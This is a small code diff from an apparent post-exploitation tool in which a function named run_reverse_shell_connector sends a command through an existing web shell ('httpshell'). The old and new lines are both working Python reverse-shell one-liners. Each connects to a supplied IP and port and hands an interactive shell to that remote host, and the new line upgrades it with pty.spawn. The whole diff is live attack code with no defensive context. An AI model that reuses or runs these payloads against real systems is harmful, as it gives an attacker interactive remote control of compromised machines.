@@ -12,7 +12,7 @@ import time
 
 
 def run_reverse_shell_connector(httpshell, ip, port):
-    httpshell.execute(f"""python3 -c 'import socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("{ip}",{port}));subprocess.call(["/bin/sh","-i"],stdin=s.fileno(),stdout=s.fileno(),stderr=s.fileno())'""")
+    httpshell.execute(f"""python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")'""")
 
 
 
